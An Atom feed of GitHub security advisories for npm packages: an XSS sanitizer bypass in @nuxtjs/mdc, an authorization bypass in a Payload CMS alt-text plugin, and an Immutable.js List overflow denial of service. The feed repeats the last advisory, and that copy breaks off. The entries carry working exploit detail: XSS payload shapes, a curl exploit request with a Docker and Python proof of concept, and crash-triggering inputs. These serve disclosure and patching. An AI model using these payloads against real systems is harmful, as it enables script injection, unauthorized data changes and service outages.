<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-09-17T13:54:18.050Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@nuxtjs/mdc] @nuxtjs/mdc's URL sanitizer misses SVG xlink:href and data:text/html, allowing XSS from untrusted markdown at the default configuration]]></title>
        <id>https://github.com/advisories/GHSA-mxm6-v9r6-r94c</id>
        <link href="https://github.com/advisories/GHSA-mxm6-v9r6-r94c"/>
        <updated>2026-09-16T22:14:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>@nuxtjs/mdc</code> renders untrusted markdown (including raw HTML) to a Vue component tree. Across two prior advisories it added a URL/attribute sanitizer to block dangerous links in that HTML: <code>validateProps</code> / <code>validateProp</code> and an <code>unsafeLinkPrefix</code> deny-list (<code>dist/runtime/parser/utils/props.js</code>). The sanitizer runs at parse time (<code>dist/runtime/parser/compiler.js</code>) and <code>parseMarkdown</code> enables raw HTML by default (<code>allowDangerousHtml: true</code>, <code>dist/runtime/parser/options.js</code>), so the sanitizer is the only barrier and it applies with no configuration required.</p>
<p>Two sibling vectors bypass that sanitizer at the default configuration:</p>
<ol>
<li><p>SVG anchor <code>xlink:href</code>. <code>validateProp</code> only scheme-checks attributes named exactly <code>href</code> or <code>src</code>:</p>
<pre><code>if (attribute === "href" || attribute === "src") return isAnchorLinkAllowed(value);
return true;
</code></pre>
<p>An <code>xlink:href</code> (parsed to the hast property <code>xLinkHref</code>) is neither, so a <code>javascript:</code> URL on an SVG <code>&lt;a&gt;</code> is passed through. The renderer maps the property back to the real attribute (<code>MDCRenderer.vue</code>: <code>find(html, "xLinkHref").attribute</code> is <code>xlink:href</code>), so the output element is <code>&lt;a xlink:href="javascript:..."&gt;</code>. Clicking it runs the script in the page origin. Plain <code>&lt;a href="javascript:..."&gt;</code> is correctly stripped, which is what makes this the un-patched sibling.</p>
</li>
<li><p><code>&lt;iframe src="data:text/html,..."&gt;</code>. <code>data:text/html</code> is present in <code>unsafeLinkPrefix</code>, but the check compares it against <code>url.protocol</code>:</p>
<pre><code>if (unsafeLinkPrefix.some((prefix) =&gt; url.protocol.toLowerCase().startsWith(prefix))) return false;
</code></pre>
<p>For any data URI <code>url.protocol</code> is just <code>"data:"</code>, so <code>"data:".startsWith("data:text/html")</code> is always false. Every <code>data:text/*</code> entry in the deny-list is therefore dead code, and <code>&lt;iframe src="data:text/html,&lt;script&gt;...&lt;/script&gt;"&gt;</code> is allowed (iframe is not in the render-time <code>dangerousTags</code>, which is only <code>["script","base"]</code>). The framed document executes script in an opaque origin. For contrast, <code>srcdoc</code> and <code>object</code> are blocked, so this is a precise gap rather than a general absence of filtering.</p>
</li>
</ol>
<h2 id="reproduction">Reproduction</h2>
<p>I will attach the zip file for POC, you can simply extract and run <code>./poc.sh</code> to install mdc and show the poc in the html file.
<a href="https://github.com/user-attachments/files/29175603/nuxtjs-mdc-xss_poc.zip">nuxtjs-mdc-xss_poc.zip</a></p>
<p>Two zero-argument checks:</p>
<ol>
<li><code>sh poc/poc.sh</code> installs <code>@nuxtjs/mdc</code> and runs <code>parseMarkdown</code> (the documented API) at default. It shows the parsed tree retains <code>a { xLinkHref: "javascript:..." }</code> and <code>iframe { src: "data:text/html,..." }</code>, while the control payloads <code>href="javascript:..."</code> and <code>srcdoc=...</code> are removed by the sanitizer. This isolates the sanitizer bypass deterministically.</li>
<li><code>poc/poc.sh</code> also serves <code>poc/poc.html</code> over http (data: iframes and javascript: links are restricted under the file:// origin, so http is used). Open the printed URL and click the blue SVG link. The page contains the exact DOM the renderer produces for those parsed nodes; clicking the SVG link executes script in the page origin (same-origin), and the data:text/html iframe executes on load. The page prints VULNERABLE for each that fires.</li>
</ol>
<p>Both vectors were confirmed executing in a current Chromium build: the SVG <code>xlink:href</code> link runs script in the document origin on click, and the data:text/html iframe runs script on load.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>In <code>validateProp</code>, scheme-check <code>xlink:href</code> (and the hast <code>xLinkHref</code>) the same way as <code>href</code>/<code>src</code>. In <code>isAnchorLinkAllowed</code>, compare the dangerous MIME-typed entries against the full URL (or <code>href</code>), not against <code>url.protocol</code>, so <code>data:text/html</code> is actually matched; or add <code>iframe</code> to the render-time dangerous-tag set / restrict iframe <code>src</code> schemes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nuxt-content/mdc/security/advisories/GHSA-mxm6-v9r6-r94c">https://github.com/nuxt-content/mdc/security/advisories/GHSA-mxm6-v9r6-r94c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63671">https://nvd.nist.gov/vuln/detail/CVE-2026-63671</a></li>
<li><a href="https://github.com/nuxt-content/mdc/pull/491">https://github.com/nuxt-content/mdc/pull/491</a></li>
<li><a href="https://github.com/nuxt-content/mdc/commit/61d636c2983f021288e4fc5c4006733b38cf0d53">https://github.com/nuxt-content/mdc/commit/61d636c2983f021288e4fc5c4006733b38cf0d53</a></li>
<li><a href="https://github.com/nuxt-content/mdc/releases/tag/v0.22.1">https://github.com/nuxt-content/mdc/releases/tag/v0.22.1</a></li>
<li><a href="https://github.com/advisories/GHSA-mxm6-v9r6-r94c">https://github.com/advisories/GHSA-mxm6-v9r6-r94c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mxm6-v9r6-r94c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T22:14:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@jhb.software/payload-alt-text-plugin] @jhb.software/payload-alt-text-plugin: Alt Text Endpoint Authorization Bypass via Payload Local API `overrideAccess` Omission]]></title>
        <id>https://github.com/advisories/GHSA-4qpv-39hg-f7fx</id>
        <link href="https://github.com/advisories/GHSA-4qpv-39hg-f7fx"/>
        <updated>2026-09-16T18:56:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="alt-text-endpoint-authorization-bypass-via-payload-local-api-overrideaccess-omission">Alt Text Endpoint Authorization Bypass via Payload Local API <code>overrideAccess</code> Omission</h2>
<h3 id="summary">Summary</h3>
<p><code>@jhb.software/payload-alt-text-plugin</code> v0.7.0 exposes custom Payload CMS endpoints (<code>POST /api/alt-text-plugin/generate</code> and <code>/bulk</code>) that call the Payload Local API (<code>findByID</code> and <code>update</code>) without setting <code>overrideAccess: false</code>. Because Payload's internal logic evaluates <code>shouldOverrideAccess = overrideAccess !== false</code>, omitting the parameter causes it to default to <code>true</code>, silently bypassing all collection-level access control functions. Any authenticated user — regardless of role — can read and overwrite the <code>alt</code> and <code>keywords</code> fields of arbitrary upload documents that would otherwise be protected by restrictive collection access rules. The vulnerability is rated <strong>High</strong> (CVSS 7.1).</p>
<h3 id="details">Details</h3>
<p>The plugin registers two network endpoints in <code>alt-text/src/plugin.ts:179-186</code>. Their default access guard (<code>plugin.ts:55</code>) only checks <code>!!req.user</code>, meaning any authenticated session satisfies the check regardless of the role required by the underlying collection.</p>
<p>The endpoint handler at <code>alt-text/src/endpoints/generateAltText.ts</code> accepts user-controlled <code>id</code>, <code>collection</code>, <code>locale</code>, and <code>update</code> fields from the request body (<code>line 29</code>), then passes them directly to two unsecured Local API calls:</p>
<p><strong>Read bypass</strong> (<code>generateAltText.ts:31</code>):</p>
<pre><code class="language-typescript">const imageDoc = await req.payload.findByID({
  id,
  collection,
  depth: 0,
  // overrideAccess: false is absent → defaults to true
})
</code></pre>
<p><strong>Write bypass</strong> (<code>generateAltText.ts:121</code>):</p>
<pre><code class="language-typescript">await req.payload.update({
  id,
  collection,
  data: {
    alt: result.result.altText,
    keywords: result.result.keywords,
  },
  locale: targetLocale,
  // overrideAccess: false is absent → defaults to true
})
</code></pre>
<p>The bulk endpoint (<code>alt-text/src/endpoints/bulkGenerateAltTexts.ts</code>) repeats the same pattern at lines <code>120</code> (read) and <code>170</code> (write).</p>
<p>Payload's internal resolution of <code>overrideAccess</code> is:</p>
<pre><code>shouldOverrideAccess = overrideAccess !== false
// undefined !== false → true → collection access function is never called
</code></pre>
<p>Because the collection-level <code>read</code> and <code>update</code> access functions are never invoked, any attacker with a valid session can target documents in any upload collection, regardless of how that collection's access is configured.</p>
<h3 id="poc">PoC</h3>
<p><strong>Environment setup:</strong></p>
<ol>
<li>Clone the repository and install <code>@jhb.software/payload-alt-text-plugin@0.7.0</code> into a Payload v3 project.</li>
<li>Configure an upload collection named <code>media</code> with <code>read</code> and <code>update</code> access restricted to users with <code>role: "admin"</code>.</li>
<li>Configure the plugin with <code>collections: ["media"]</code> and a resolver that returns <code>{ success: true, result: { altText: "PWNED_BY_EXPLOIT", keywords: ["hacked", "bypass"] } }</code>.</li>
<li>As an admin, create a media document (e.g., ID <code>doc-001</code>) with <code>alt = "original safe alt text"</code>.</li>
<li>Obtain a session token for a non-admin user (<code>role: "user"</code>).</li>
</ol>
<p><strong>Build and run the dynamic PoC (Docker):</strong></p>
<pre><code class="language-bash"># Build
docker build -t vuln001-poc -f vuln-001/Dockerfile .

# Run
docker run --rm vuln001-poc
</code></pre>
<p><strong>Exploit request:</strong></p>
<pre><code class="language-bash">curl -i -b "payload-token=&lt;LOW_PRIV_TOKEN&gt;" \
  -H "Content-Type: application/json" \
  -X POST http://localhost:3000/api/alt-text-plugin/generate \
  --data '{"collection":"media","id":"doc-001","locale":"en","update":true}'
</code></pre>
<p><strong>Expected result:</strong></p>
<ul>
<li>HTTP 200 is returned.</li>
<li>The response body contains <code>"altText": "PWNED_BY_EXPLOIT"</code>.</li>
<li>A subsequent admin read of <code>media/doc-001</code> confirms <code>alt = "PWNED_BY_EXPLOIT"</code> and <code>keywords = ["hacked", "bypass"]</code>, despite the collection's update access being restricted to admins.</li>
</ul>
<p><strong>Control verification (confirms the bypass is real, not a misconfiguration):</strong></p>
<p>A direct Local API call with <code>overrideAccess: false</code> by the same non-admin user throws <code>AccessError: update denied for collection "media" (user role: user)</code>, proving that the access rule is correct and the plugin endpoint is the vector.</p>
<p><strong>Dynamic reproduction output (Phase 2 confirmed):</strong></p>
<pre><code>VULN-001: Alt Text endpoint authorization bypass
  Payload Local API overrideAccess omission in
  generateAltText.ts:31 and :121

[Step 1] Control: non-admin direct update with overrideAccess:false
  PASS: access correctly denied → AccessError

[Step 3] EXPLOIT: non-admin calls POST /api/alt-text-plugin/generate
  HTTP status : 200
  Response    : {"id":"doc-001","collection":"media","altText":"PWNED_BY_EXPLOIT","keywords":["hacked","bypass"]}

VULNERABILITY CONFIRMED — EXPLOITATION SUCCESSFUL
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an <strong>Incorrect Authorization</strong> vulnerability (CWE-863). The plugin's endpoints act as an authorization bypass tunnel into Payload's Local API. Any authenticated user — a subscriber, editor, or any low-privilege role — can:</p>
<ol>
<li><strong>Read</strong> the content of arbitrary upload documents that collection access rules would otherwise deny them.</li>
<li><strong>Overwrite</strong> the <code>alt</code> text and <code>keywords</code> fields on those documents, effectively performing unauthorized content modification.</li>
</ol>
<p>Operators who restrict upload collection access by role (a common production pattern) are fully impacted. Attackers do not need admin credentials; any valid session suffices. The vulnerability is exploitable on all default deployments where the plugin is enabled, with no special configuration required on the attacker's side.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile"># Dockerfile for VULN-001 dynamic reproduction
#
# Build context: the parent directory that contains both
#   repo/          (jhb-software/payload-plugins clone)
#   vuln-001/      (this workspace)
#
# Build:  docker build -t vuln001-poc -f vuln-001/Dockerfile .
# Run:    docker run --rm vuln001-poc

FROM node:22-slim

WORKDIR /app

# ---- Copy plugin source files required by the PoC ----
# Only the endpoint under test and its direct dependencies are needed.
# No Payload framework install required: we mock it in the PoC.

COPY repo/alt-text/src/endpoints/generateAltText.ts  ./plugin/src/endpoints/generateAltText.ts
COPY repo/alt-text/src/endpoints/schemas.ts          ./plugin/src/endpoints/schemas.ts
COPY repo/alt-text/src/utilities/mimeTypes.ts        ./plugin/src/utilities/mimeTypes.ts
COPY repo/alt-text/src/types/AltTextPluginConfig.ts  ./plugin/src/types/AltTextPluginConfig.ts
COPY repo/alt-text/src/resolvers/types.ts            ./plugin/src/resolvers/types.ts

# ---- Copy PoC files ----
COPY vuln-001/package_inner.json ./package.json
COPY vuln-001/inner_poc.ts       ./inner_poc.ts

# ---- Install minimal runtime dependencies ----
# zod: schema validation used by the endpoint handler
# tsx:  TypeScript executor that handles .js→.ts extension mapping
RUN npm install --no-audit --no-fund

# ---- Run the PoC ----
CMD ["node_modules/.bin/tsx", "inner_poc.ts"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
poc.py — VULN-001 Dynamic Reproduction Orchestrator

Vulnerability: @jhb.software/payload-alt-text-plugin v0.7.0
Title: Alt Text endpoint authorization bypass via Payload Local API overrideAccess omission
CWE: CWE-863 (Incorrect Authorization)

This script:
  1. Builds a Docker image containing the real plugin endpoint source.
  2. Runs the container, which calls the endpoint handler with a non-admin user.
  3. Captures stdout/stderr as evidence.
  4. Writes the result to phase2_result.json.

Usage:
  python3 poc.py

Safety:
  - All traffic stays on 127.0.0.1 / localhost inside Docker.
  - No external services are contacted.
  - No live credentials are used.
"""

import json
import os
import subprocess
import sys

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

THIS_DIR = os.path.dirname(os.path.abspath(__file__))
# Build context: parent directory that contains both repo/ and vuln-001/
BUILD_CONTEXT = os.path.dirname(THIS_DIR)
DOCKERFILE = os.path.join(THIS_DIR, "Dockerfile")
IMAGE_TAG = "vuln001-poc"
RESULT_FILE = os.path.join(THIS_DIR, "phase2_result.json")

BUILD_COMMAND = f"docker build -t {IMAGE_TAG} -f vuln-001/Dockerfile ."
RUN_COMMAND = f"docker run --rm {IMAGE_TAG}"
POC_COMMAND = f"python3 poc.py"


def run(cmd: list[str], cwd: str, timeout: int = 180) -&gt; tuple[int, str, str]:
    """Run a subprocess and return (returncode, stdout, stderr)."""
    result = subprocess.run(
        cmd,
        cwd=cwd,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.returncode, result.stdout, result.stderr


def write_result(passed: bool, verdict: str, reason: str, evidence: str,
                 build_out: str = "", run_out: str = "", failure_detail: str = "") -&gt; None:
    """Write phase2_result.json."""
    data: dict = {
        "passed": passed,
        "verdict": verdict,
        "reason": reason,
        "build_command": BUILD_COMMAND,
        "run_command": RUN_COMMAND,
        "poc_command": POC_COMMAND,
        "evidence": evidence,
        "artifacts": ["Dockerfile", "poc.py"],
    }
    if failure_detail:
        data["failure_detail"] = failure_detail
    if build_out:
        data["build_output_tail"] = build_out[-2000:]
    if run_out:
        data["run_output"] = run_out
    with open(RESULT_FILE, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)
    print(f"\nResult written to: {RESULT_FILE}")


def main() -&gt; int:
    # -----------------------------------------------------------------------
    # Step 1: Build the Docker image
    # -----------------------------------------------------------------------
    print("=" * 60)
    print("VULN-001 Dynamic Reproduction")
    print("=" * 60)
    print()
    print(f"[1/2] Building Docker image: {IMAGE_TAG}")
    print(f"      Context : {BUILD_CONTEXT}")
    print(f"      Command : {BUILD_COMMAND}")
    print()

    rc, build_stdout, build_stderr = run(
        ["docker", "build", "-t", IMAGE_TAG, "-f", "vuln-001/Dockerfile", "."],
        cwd=BUILD_CONTEXT,
    )

    combined_build = (build_stdout + build_stderr).strip()
    if rc != 0:
        print("ERROR: Docker build failed.")
        print(combined_build[-3000:])
        write_result(
            passed=False,
            verdict="FAIL",
            reason="Docker 빌드 실패 — npm install 또는 파일 복사 오류",
            evidence="",
            build_out=combined_build,
            failure_detail=f"docker build exit code {rc}:\n{combined_build[-2000:]}",
        )
        return 1

    print("      Build succeeded.")
    print()

    # -----------------------------------------------------------------------
    # Step 2: Run the PoC container
    # -----------------------------------------------------------------------
    print(f"[2/2] Running PoC container")
    print(f"      Command : {RUN_COMMAND}")
    print()

    rc, run_stdout, run_stderr = run(
        ["docker", "run", "--rm", IMAGE_TAG],
        cwd=BUILD_CONTEXT,
    )

    combined_run = (run_stdout + run_stderr).strip()
    print(combined_run)
    print()

    # -----------------------------------------------------------------------
    # Step 3: Evaluate the output
    # -----------------------------------------------------------------------
    success_marker = "VULNERABILITY CONFIRMED"
    pwned_marker = "PWNED_BY_EXPLOIT"

    if rc == 0 and success_marker in combined_run and pwned_marker in combined_run:
        # Extract the key evidence block
        lines = combined_run.splitlines()
        evidence_lines = []
        in_block = False
        for line in lines:
            if success_marker in line or pwned_marker in line or "EXPLOITATION" in line:
                in_block = True
            if in_block:
                evidence_lines.append(line)
            if in_block and line.startswith("→"):
                break
        evidence = "\n".join(evidence_lines) if evidence_lines else combined_run[-1500:]

        write_result(
            passed=True,
            verdict="PASS",
            reason=(
                "비관리자(role=user) 세션이 POST /api/alt-text-plugin/generate?update=true 호출을 통해 "
                "admin 전용 컬렉션의 문서 필드(alt, keywords)를 임의 수정하는 것을 실제 엔드포인트 코드 실행으로 확인. "
                "generateAltText.ts:121에서 payload.update()가 overrideAccess:false 없이 호출되어 "
                "Payload Local API의 기본 shouldOverrideAccess = undefined !== false → true 로직에 의해 "
                "컬렉션 레벨 access 함수가 우회됨. "
                "직접 update(overrideAccess:false) 호출은 AccessError로 차단되지만 플러그인 엔드포인트 경유 시 성공."
            ),
            evidence=evidence,
            run_out=combined_run,
        )
        print("PASS — vulnerability dynamically confirmed.")
        return 0

    else:
        print("FAIL — success marker not found or container exited non-zero.")
        write_result(
            passed=False,
            verdict="FAIL" if rc != 0 else "INCOMPLETE",
            reason=(
                f"컨테이너 종료 코드 {rc}. "
                "성공 마커(VULNERABILITY CONFIRMED)가 출력에서 발견되지 않음. "
                "로그를 확인하여 원인 파악 필요."
            ),
            evidence=combined_run[-2000:],
            run_out=combined_run,
            failure_detail=f"Container exit code: {rc}\nstdout+stderr:\n{combined_run}",
        )
        return 1


if __name__ == "__main__":
    sys.exit(main())
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jhb-software/payload-plugins/security/advisories/GHSA-4qpv-39hg-f7fx">https://github.com/jhb-software/payload-plugins/security/advisories/GHSA-4qpv-39hg-f7fx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59965">https://nvd.nist.gov/vuln/detail/CVE-2026-59965</a></li>
<li><a href="https://github.com/jhb-software/payload-plugins/pull/159">https://github.com/jhb-software/payload-plugins/pull/159</a></li>
<li><a href="https://github.com/jhb-software/payload-plugins/commit/e39634868ce13a414e2981e219befc58101654d3">https://github.com/jhb-software/payload-plugins/commit/e39634868ce13a414e2981e219befc58101654d3</a></li>
<li><a href="https://github.com/jhb-software/payload-plugins/releases/tag/alt-text@0.8.0">https://github.com/jhb-software/payload-plugins/releases/tag/alt-text@0.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-4qpv-39hg-f7fx">https://github.com/advisories/GHSA-4qpv-39hg-f7fx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4qpv-39hg-f7fx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-10T22:39:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[immutable] Immutable.js `List` 32-bit trie overflow → unrecoverable DoS]]></title>
        <id>https://github.com/advisories/GHSA-v56q-mh7h-f735</id>
        <link href="https://github.com/advisories/GHSA-v56q-mh7h-f735"/>
        <updated>2026-09-16T18:47:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>List#set</code>, <code>List#setSize</code>, <code>List#setIn</code>, <code>List#updateIn</code> (and the functional <code>set</code> / <code>setIn</code> / <code>updateIn</code>) mishandle an index or size in the range <code>[2 ** 30, 2 ** 31)</code>:</p>
<ul>
<li>On an <strong>empty</strong> <code>List</code> the operation enters an <strong>uncatchable infinite loop</strong> (a tight CPU spin; a surrounding <code>try/catch</code> never regains control). Only killing the worker recovers it.</li>
<li>On a <strong>populated</strong> <code>List</code> (≥ 32 elements — i.e. any array of ≥ 32 items turned into a <code>List</code> by <code>fromJS</code>) the loop allocates without bound → heap exhaustion → the <strong>process aborts</strong> (<code>SIGABRT</code>, exit <code>134</code>, or kernel OOM-kill <code>137</code>). A real crash, not a recoverable error.</li>
</ul>
<p>The index may be a <strong>numeric string</strong>, so it can come straight from a request body, URL, or key-path. A single small unauthenticated request is enough.</p>
<p>There is also a companion <strong>silent data-corruption</strong> issue in <code>setSize</code>:</p>
<pre><code class="language-js">List([1, 2, 3]).setSize(2 ** 31); // before fix =&gt; size 0  (silently cleared)
List([1, 2, 3]).setSize(2 ** 32 + 5); // before fix =&gt; size 5  (huge value wraps to 5)
</code></pre>
<h2 id="impact">Impact</h2>
<p>Availability only. A reachable configuration is any endpoint that routes untrusted input into a <code>List</code> index or a <code>setIn</code>/<code>updateIn</code> key-path — which the extremely common <code>state = fromJS(body); state.setIn(userPath, value)</code> pattern does (config stores, document/collection editors, redux-immutable reducers, JSON-Patch endpoints, etc.).</p>
<p>No confidentiality or integrity impact, no RCE. The companion <code>setSize</code> bug can silently corrupt application state (wrong size) without crashing.</p>
<h2 id="reproduction-immutable-517">Reproduction (immutable 5.1.7)</h2>
<pre><code class="language-ts">import { fromJS, List } from 'immutable';

// 1) Populated List: OOM -&gt; process abort (SIGABRT, exit 134) within ~2s
fromJS({ items: new Array(64).fill(0) }).setIn(['items', '1073741824'], 'x');

// 2) Empty List: hangs forever, uncatchable
List().set(2 ** 30, 'x');

// 3) Silent truncation
List([1, 2, 3]).setSize(2 ** 31); // =&gt; size 0
List([1, 2, 3]).setSize(2 ** 32 + 5); // =&gt; size 5
</code></pre>
<p>A remote 43-byte HTTP request (<code>{"path":["items","1073741824"],"value":"x"}</code>) is sufficient to abort a worker that applies it via <code>state = state.setIn(path, value)</code>.</p>
<p>Any index in <code>[2 ** 30, 2 ** 31)</code> works (<code>1073741824</code>, <code>2000000000</code>, …). An index in <code>[2 ** 31, 2 ** 32)</code> does not crash — it silently wraps (clearing the List) via the same root cause.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>List</code> stores its values in a 32-wide trie (<code>SHIFT = 5</code>, so each level addresses 5 more bits) and uses <strong>signed 32-bit bitwise arithmetic</strong> throughout <code>setListBounds()</code> (<code>src/List.js</code>):</p>
<ol>
<li><strong>Infinite loop (the hang / OOM).</strong> The level-raising loop</li>
</ol>
<pre><code class="language-js">while (newTailOffset &gt;= 1 &lt;&lt; (newLevel + SHIFT)) {
  newRoot = new VNode(
    newRoot &amp;&amp; newRoot.array.length ? [newRoot] : [],
    owner
  );
  newLevel += SHIFT;
}
</code></pre>
<p>relies on <code>1 &lt;&lt; (newLevel + SHIFT)</code>. A JavaScript shift count is taken <strong>mod 32</strong>, so once <code>newLevel + SHIFT</code> reaches <code>31</code> the term goes <strong>negative</strong> (<code>1 &lt;&lt; 31 === -2147483648</code>) and at <code>32</code> wraps to <code>1</code> (<code>1 &lt;&lt; 35 === 8</code>). The comparison then stays <code>true</code> forever and the loop never terminates. On a populated <code>List</code>, each iteration retains a new <code>VNode</code> (<code>[newRoot]</code>), so the heap fills and V8 aborts; on an empty <code>List</code> it spins on CPU without allocating.</p>
<ol start="2">
<li><strong>Silent wraparound (the <code>setSize</code> corruption).</strong> The <code>begin |= 0</code> / <code>end |= 0</code> coercion (<code>ToInt32</code>) silently wraps large finite values (<code>(2 ** 31) | 0 === -2147483648</code>, <code>(2 ** 32 + 5) | 0 === 5</code>), producing a wrong resulting size instead of an error.</li>
</ol>
<p>The threshold is <code>2 ** 30</code>: that is the largest size for which <code>1 &lt;&lt; (newLevel + SHIFT)</code> stays a valid positive 32-bit integer throughout the loops (<code>newLevel + SHIFT</code> stays ≤ 30).</p>
<h2 id="remediation">Remediation</h2>
<p>The fix is contained to <code>setListBounds()</code> in <code>src/List.js</code>:</p>
<ol>
<li><p><strong>Validate up front, before the lossy <code>| 0</code> coercion.</strong> Compute the intended origin and capacity in full precision and throw a clear, catchable <code>RangeError</code> when they exceed the addressable range (<code>MAX_LIST_SIZE = 2 ** 30</code>). <code>Infinity</code>/<code>NaN</code> are left to the existing <code>| 0 → 0</code> behaviour (so <code>setSize(Infinity)</code> stays <code>0</code> and <code>slice(0, Infinity)</code> still means "to the end").</p>
</li>
<li><p><strong>Stop the shift from wrapping.</strong> Replace <code>1 &lt;&lt; exp</code> in the level-raising loops with a helper that uses the cheap bitwise shift while it is exact (<code>exp ≤ 30</code>, the common path including every <code>push</code>/<code>setSize</code>/<code>slice</code>) and falls back to the non-wrapping <code>2 ** exp</code> only for the rare deep trees reached when a negative origin (<code>unshift</code> / negative index) is normalized to a large positive capacity (<code>exp</code> can reach 35 there, where <code>1 &lt;&lt; 35</code> would wrap to 8).</p>
</li>
</ol>
<p>This turns every hang, the misleading <code>"Maximum call stack size exceeded"</code>, the OOM/<code>SIGABRT</code>, and the silent <code>setSize</code> truncation into one descriptive <code>RangeError</code>, preserves all behaviour for sizes <code>&lt; 2 ** 30</code>, and keeps the hot <code>push</code> path on the fast bitwise shift (the <code>2 ** exp</code> branch is never reached by non-negative operations).</p>
<h3 id="is-the-new-limit-a-breaking-change">Is the new limit a breaking change?</h3>
<p>No working code is affected. A <code>List</code> could never actually hold <code>≥ 2 ** 30</code> values before — the attempt hung, crashed, or silently corrupted the size. The limit was already implicit in the 32-bit trie; the fix only makes it explicit and catchable, mirroring native JS arrays (<code>new Array(2 ** 32)</code> → <code>RangeError: Invalid array length</code>). The single observable behaviour change is that <code>setSize(hugeValue)</code>, which used to return a silently wrong size, now throws. <code>2 ** 30</code> ≈ 1.07 billion entries (~8 GB of pointers alone), far beyond any practical use.</p>
<h2 id="mitigations-for-users-who-cannot-upgrade-immediately">Mitigations (for users who cannot upgrade immediately)</h2>
<ul>
<li>Validate/clamp any externally supplied <code>List</code> index or <code>setIn</code>/<code>updateIn</code> key-path segment against a sane maximum before passing it to immutable.</li>
<li>Reject numeric path segments <code>≥ 2 ** 30</code>.</li>
<li>Run request handling in a worker that can be restarted, and cap the heap (<code>--max-old-space-size</code>) so an abort is contained.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735">https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59879">https://nvd.nist.gov/vuln/detail/CVE-2026-59879</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84">https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a">https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9">https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8">https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v3.8.4">https://github.com/immutable-js/immutable-js/releases/tag/v3.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-v56q-mh7h-f735">https://github.com/advisories/GHSA-v56q-mh7h-f735</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v56q-mh7h-f735</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-21T18:36:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[immutable] Immutable.js `List` 32-bit trie overflow → unrecoverable DoS]]></title>
        <id>https://github.com/advisories/GHSA-v56q-mh7h-f735</id>
        <link href="https://github.com/advisories/GHSA-v56q-mh7h-f735"/>
        <updated>2026-09-16T18:47:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>List#set</code>, <code>List#setSize</code>, <code>List#setIn</code>, <code>List#updateIn</code> (and the functional <code>set</code> / <code>setIn</code> / <code>updateIn</code>) mishandle an index or size in the range <code>[2 ** 30, 2 ** 31)</code>:</p>
<ul>
<li>On an <strong>empty</strong> <code>List</code> the operation enters an <strong>uncatchable infinite loop</strong> (a tight CPU spin; a surrounding <code>try/catch</code> never regains control). Only killing the worker recovers it.</li>
<li>On a <strong>populated</strong> <code>List</code> (≥ 32 elements — i.e. any array of ≥ 32 items turned into a <code>List</code> by <code>fromJS</code>) the loop allocates without bound → heap exhaustion → the <strong>process aborts</strong> (<code>SIGABRT</code>, exit <code>134</code>, or kernel OOM-kill <code>137</code>). A real crash, not a recoverable error.</li>
</ul>
<p>The index may be a <strong>numeric string</strong>, so it can come straight from a request body, URL, or key-path. A single small unauthenticated request is enough.</p>
